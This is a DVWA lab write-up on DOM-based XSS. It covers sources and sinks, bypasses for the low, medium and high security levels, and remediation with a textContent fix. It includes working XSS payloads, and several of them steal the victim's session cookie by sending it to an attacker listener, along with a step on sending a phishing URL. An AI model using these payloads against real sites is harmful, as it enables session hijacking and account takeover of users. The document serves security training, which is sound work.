## 1. Introduction

DOM-Based XSS is a type of Cross-Site Scripting where the vulnerability exists entirely in client-side JavaScript code — the malicious payload never reaches the server. The browser's DOM is manipulated by unsafe JavaScript that reads data from attacker-controlled sources (like `document.location` or URL parameters) and writes it into dangerous sinks (like `innerHTML` or `document.write()`).

**Goal of this lab:** Exploit DOM-based XSS in DVWA to execute arbitrary JavaScript and steal the victim's session cookie.

## 3. Vulnerability Overview

### What is DOM-Based XSS?

| XSS Type   | Where vulnerability lives | Server sees payload? |
|------------|---------------------------|----------------------|
| Reflected  | Server-side               | Yes                  |
| Stored     | Server-side (database)    | Yes                  |
| DOM-based  | Client-side (JavaScript)  | No                   |

**Vulnerable JavaScript pattern:**
```javascript
// Dangerous: reads URL parameter and writes to DOM
var lang = document.location.href.substring(document.location.href.indexOf("default=") + 8);
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```

**Sources (dangerous input):** `document.location`, `document.URL`, `document.referrer`, `window.name`

**Sinks (dangerous output):** `innerHTML`, `document.write()`, `eval()`, `setTimeout()`, `location.href`

## 4. Exploitation

### 4.1 Low Security Level

**Setup:** Navigate to DVWA → XSS (DOM). Set security to **Low**.

**Default URL:**
```
http://localhost/dvwa/vulnerabilities/xss_d/?default=English
```

#### Step 1 – Test Normal Behavior

The page has a language dropdown. The `default` parameter controls which option is selected.

#### Step 2 – Inject Script in URL Parameter

**Payload:**
```
http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert(1)</script>
```

**Result:** Alert fires — DOM XSS confirmed.

#### Step 3 – Cookie Stealing

Start listener:
```bash
python3 -m http.server 8000
```

**Payload:**
```
http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>window.location='http://192.168.x.x:8000/?cookie='+document.cookie</script>
```

**Result in terminal:**
```
"GET /?cookie=PHPSESSID=abc123;security=low HTTP/1.1" 200
```

✅ Cookie stolen!

#### Step 4 – Craft Phishing URL

The full attack URL would be shared with the victim. When they open it, their cookie is sent to the attacker's server — no server interaction needed from the target's perspective.

---

### 4.2 Medium Security Level

**Setup:** Set security to **Medium**.

**Observation:** The `<script>` tag is now being filtered by the server.

#### Step 1 – Test Basic Payload (Blocked)

```
?default=<script>alert(1)</script>
```

→ No alert — `<script>` is stripped.

#### Step 2 – Analyze the DOM Structure

Inspect the page source. The payload lands inside a `<select>` element:
```html
<select name="default">
  <option value='English'>English</option>
  ...
  [our input renders here]
</select>
```

#### Step 3 – Break Out of `<select>` and Use SVG

To inject executable code, we must first close the `<select>` element:

**Payload:**
```
?default=English</select><svg/onload=alert(1)>
```

**Result:** Alert fires ✅

#### Step 4 – Cookie Stealing

**Payload:**
```
?default=English</select><svg/onload=window.location='http://192.168.x.x:8000/?cookie='+document.cookie>
```

URL-encoded for sharing:
```
?default=English%3C/select%3E%3Csvg/onload=window.location=%27http://192.168.x.x:8000/?cookie=%27%2Bdocument.cookie%3E
```

### 4.3 High Security Level

**Setup:** Set security to **High**.

**Observation:** The server now uses a whitelist — only valid language names (English, French, Spanish, German) are accepted. All other inputs return "English" as the default.

**Key insight:** The URL **fragment** (`#`) is never sent to the server — the browser handles it entirely client-side.

#### Step 1 – Understand the Fragment Trick

When a URL contains a `#`:
```
http://localhost/dvwa/vulnerabilities/xss_d/?default=English#<payload>
```

- The server receives: `?default=English` (valid, passes whitelist)
- The browser has access to: `#<payload>` via `document.location.hash`

#### Step 2 – Confirm Fragment Injection

**URL:**
```
http://localhost/dvwa/vulnerabilities/xss_d/#<script>alert(1)</script>
```

**Result:** Alert fires — the client-side JavaScript reads from `document.location` which includes the fragment, and writes it unsafely to the DOM. ✅

#### Step 3 – Cookie Stealing via Fragment

**URL:**
```
http://localhost/dvwa/vulnerabilities/xss_d/#<script>window.location='http://192.168.x.x:8000/?cookie='+document.cookie</script>
```

**Result:** Session cookie exfiltrated. ✅

> **Important:** Use **straight quotes** (`'`), not typographic quotes. If copying from a document, verify the character encoding.

## 5. DOM XSS Source-to-Sink Analysis

```
Source: document.location (URL parameter / fragment)
         ↓
JavaScript reads the value
         ↓
Sink: document.write() / innerHTML
         ↓
Malicious script inserted into the DOM
         ↓
Script executes in victim's browser context
         ↓
Cookie / data exfiltrated to attacker
```

## 8. Remediation Recommendations

| Fix                           | Description                                                      |
|-------------------------------|------------------------------------------------------------------|
| **Avoid Dangerous Sinks**     | Don't use `innerHTML`, `document.write()`, `eval()` with user data |
| **Context-Aware Encoding**    | Use `textContent` instead of `innerHTML` for text               |
| **Sanitize DOM Input**        | Use DOMPurify library to sanitize HTML                           |
| **URL Validation**            | Validate URL parameters before passing to DOM manipulation code  |
| **Content Security Policy**   | Strict CSP to block unauthorized script execution               |
| **Avoid Reading URL in JS**   | Don't read `document.location` directly into DOM without sanitization |

**Secure JavaScript Fix:**
```javascript
// Vulnerable
document.write("<option>" + decodeURI(document.location.href) + "</option>");

// Secure – use textContent
var lang = new URLSearchParams(document.location.search).get('default');
var option = document.createElement('option');
option.textContent = lang;  // Safe – no HTML interpretation
document.getElementById('lang-select').appendChild(option);
```
